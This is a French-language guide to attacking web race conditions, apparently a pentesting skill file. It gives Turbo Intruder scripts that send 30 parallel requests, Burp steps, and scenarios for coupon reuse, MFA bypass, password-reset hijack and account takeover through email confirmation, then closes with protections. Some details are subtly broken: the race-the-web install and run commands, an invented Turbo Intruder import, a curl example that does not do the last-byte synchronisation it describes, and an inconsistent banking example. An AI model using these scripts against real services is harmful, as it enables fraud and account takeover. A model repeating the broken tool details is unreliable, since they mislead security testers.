---
name: race-condition-attacks
description: Guide complet d'attaques Race Condition web — TOCTOU, limit overrun, single-packet attack, Turbo Intruder, Burp Repeater, multi-endpoint race.
category: cybersecurite
tags: [race-condition, toctou, concurrency, burp, turbointruder, single-packet, portswigger]
---

# Attaques Race Condition

## Sommaire
1. [Concepts](#concepts)
2. [Limit Overrun](#limit-overrun)
3. [Single-Packet Attack](#single-packet-attack)
4. [Turbo Intruder](#turbo-intruder)
5. [Multi-endpoint Race](#multi-endpoint-race)
6. [Single-endpoint Race](#single-endpoint-race)
7. [TOCTOU (Time-of-Check Time-of-Use)](#toctou)
8. [Connection Warming](#connection-warming)
9. [Partial Construction Race](#partial-construction-race)
10. [Methodologie](#methodologie)
11. [Outils](#outils)

## Concepts

Une race condition survient quand le système traite des requêtes concurrentes
sans mécanisme de verrouillage adéquat. La fenêtre de concurrence (race window)
peut durer de quelques microsecondes à plusieurs millisecondes.

### Types de race conditions :
- **Limit overrun** : dépasser un compteur d'utilisation unique (code promo, gift card)
- **TOCTOU** : Time-of-check / Time-of-use (vérifier puis utiliser)
- **Multi-endpoint** : deux endpoints différents modifient la même donnée
- **Single-endpoint** : mêmes données envoyées avec des paramètres différents
- **Partial construction** : état intermédiaire exploitable pendant la création d'un objet

## Limit Overrun

Scénario classique : un code promo à usage unique.

### État normal :
```
1. Vérifier que le code n'a pas été utilisé ✓
2. Appliquer la réduction
3. Marquer le code comme utilisé
```

### Avec race condition (2 requêtes simultanées) :
```
Requête A : Vérification ✓ → Réduction appliquée ✓
Requête B : Vérification ✓ (pas encore marqué utilisé) → Réduction appliquée ✓
```

### Détection avec Burp Repeater (HTTP/2) :
1. Capturer la requête POST /coupon
2. Créer 20-30 onglets identiques dans Repeater
3. Clic droit → **Send group in parallel** (HTTP/2)
4. Observer : si plusieurs réponses 200 → race condition confirmée

### Détection avec Turbo Intruder :
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    for i in range(30):
        engine.queue(target.req, gate='race')
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

## Single-Packet Attack

Découverte par PortSwigger Research (Black Hat USA 2023).
Technique qui élimine le jitter réseau en envoyant 20-30 requêtes
dans un **seul paquet TCP**.

### Prérequis :
- HTTP/2 supporté (h2c ou h2)
- Burp Suite 2023.9+ ou Turbo Intruder récent

### Mécanisme :
Avec HTTP/2, plusieurs requêtes peuvent être envoyées avant d'avoir reçu
la moindre réponse. Burp les envoie en une seule frame TCP → zéro délai réseau.

### En Turbo Intruder :
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)  # ← BURP2 engine obligatoire
    for i in range(30):
        engine.queue(target.req, gate='1')
    engine.openGate('1')
```

## Multi-endpoint Race

Deux endpoints différents qui modifient le même objet ou état.

### Exemple e-commerce :
```
POST /paiement/valider  → valide le paiement
POST /panier/ajouter    → ajoute des articles
```
Si les deux arrivent dans le même race window, le panier modifié
après validation du paiement mais avant confirmation de commande.

### Exemple MFA bypass :
```python
# Dans le code serveur (vulnérable) :
session['userid'] = user.userid
if user.mfa_enabled:
    session['enforce_mfa'] = True
    # envoyer code MFA...
    
# Race window : session['userid'] défini MAIS enforce_mfa pas encore
```

### Workflow de détection :
1. Identifier deux endpoints qui touchent la même ressource/session
2. Les envoyer en parallèle (single-packet attack)
3. Vérifier l'état final de la ressource

## Single-endpoint Race

Deux requêtes vers le même endpoint avec des valeurs différentes.

### Exemple password reset :
```
Session A : POST /reset-password → {username: victim}
Session B : POST /reset-password → {username: attacker}
```

Résultat de la collision :
```
session['reset-user'] = victim     # de la requête A
session['reset-token'] = 1234      # de la requête B (envoyé à l'attaquant)
```

### Exemple email confirmation :
```python
# Session unique, 2 requêtes parallèles
POST /confirm-email {user: victim, email: attacker@evil.com}
POST /confirm-email {user: attacker, email: attacker@evil.com}
# Résultat : compte victim lié à l'email attacker
```

## TOCTOU (Time-of-Check Time-of-Use)

Fenêtre entre la vérification d'une condition et l'utilisation du résultat.

### Exemple retrait bancaire :
```
Thread 1 : SELECT balance FROM account WHERE id=1 → balance=100
Thread 2 : SELECT balance FROM account WHERE id=1 → balance=100  ← pas encore débité
Thread 1 : UPDATE account SET balance=0  WHERE id=1
Thread 2 : UPDATE account SET balance=0  WHERE id=1  ← 200$ retirés, solde = 0
```

### Exemple file upload race :
```
1. Vérifier que le fichier n'existe pas → check
2. (RACE WINDOW) ← upload concurrent
3. Écrire le fichier
```
Exploitation : uploader un fichier PHP avec vérification contournée.

## Connection Warming

Technique pour réduire la latence de la première connexion avant l'attaque :

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    
    # WARMUP - ouvrir la connexion
    engine.queue(target.req, gate='warmup')
    engine.openGate('warmup')
    engine.closeGate('race')
    
    # ATTACK - 30 requêtes parallèles
    for i in range(30):
        engine.queue(target.req, gate='race')
    engine.openGate('race')
```

## Partial Construction Race

Quand un objet est créé en plusieurs étapes SQL, un état intermédiaire
est exploitable.

### Exemple registration user+API key :
```sql
INSERT INTO users (username) VALUES ('victim');  -- user créé
-- RACE WINDOW : API key = NULL ou ''
INSERT INTO api_keys (user_id, key) VALUES (1, 'secret');  -- key créée
```

### Exploitation :
Si l'API key est vide/null pendant la race window, un attaquant peut
s'authentifier avec une key vide.

### Test avec valeurs par défaut :
- PHP : `param[]` → `[]` (array vide)
- Ruby on Rails : `param[key]` (sans valeur) → `nil`
- JSON : omettre le champ → `null`

## Methodologie

D'après le whitepaper **Smashing the State Machine** (PortSwigger Research) :

### 1. Predict (cibler les endpoints)
Se poser deux questions :
- **Security critical ?** L'endpoint touche-t-il des données sensibles ?
- **Collision potential ?** Deux requêtes modifient-elles le même objet ?

### 2. Probe (détecter les anomalies)
1. Benchmark : envoyer les requêtes **en séquence** → comportement normal
2. Attack : envoyer les mêmes requêtes **en parallèle** (single-packet)
3. Compare : chercher TOUTE différence (statut, message, effet secondaire)

### 3. Prove (confirmer l'exploitation)
1. Réduire le nombre de requêtes (trouver le minimum nécessaire)
2. Isoler le race window exact
3. Automatiser l'exploitation

## Outils

### Burp Suite Repeater (recommandé) :
- HTTP/2 natif depuis Burp 2023.9+
- **Send group in parallel** : single-packet attack intégré
- **Trigger race conditions** : custom action pour test rapide

### Turbo Intruder (BApp Store) :
```python
from turbo_intruder import *

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    
    # Configuration
    engine.startAttack()
    
    # 30 requêtes en parallel
    for i in range(30):
        engine.queue(target.req, gate='1')
    engine.openGate('1')
    
    # Optionnel : plusieurs vagues
    engine.closeGate('2')
    for i in range(30):
        engine.queue(target.req, gate='2')
    engine.openGate('2')
```

### race-the-web (Doyensec) :
```bash
git clone https://github.com/doyensec/race-the-web.git
cd race-the-web
pip install -r requirements.txt
python race.py -i race_requests.txt -o results.txt
```

### Reader pour HTTP/1 sans HTTP/2 :
```bash
# Last-byte synchronization
# Envoyer toutes les requêtes sauf le dernier byte
# Envoyer les derniers bytes simultanément
curl -X POST --data-binary @req1.txt http://target.com/endpoint &
curl -X POST --data-binary @req2.txt http://target.com/endpoint &
wait
```

## Protections
- **Transactions atomiques** (SELECT ... FOR UPDATE)
- **Verrous pessimistes** en base de données
- **Idempotency keys** côté client
- **Rate limiting** cohérent (atomic counter)
- **Files d'attente** (queue) pour les opérations critiques
- **Session locking** (PHP session handler natif, etc.)
- **Validation après écriture** (re-read pattern)

## Ressources
- **PortSwigger Race Conditions** : https://portswigger.net/web-security/race-conditions
- **Smashing the State Machine** (PortSwigger Research) : https://portswigger.net/research/smashing-the-state-machine
- **HackTricks Race Condition** : https://book.hacktricks.xyz/pentesting-web/race-condition
- **Doyensec race-the-web** : https://github.com/doyensec/race-the-web
- **Turbo Intruder** : https://github.com/PortSwigger/turbo-intruder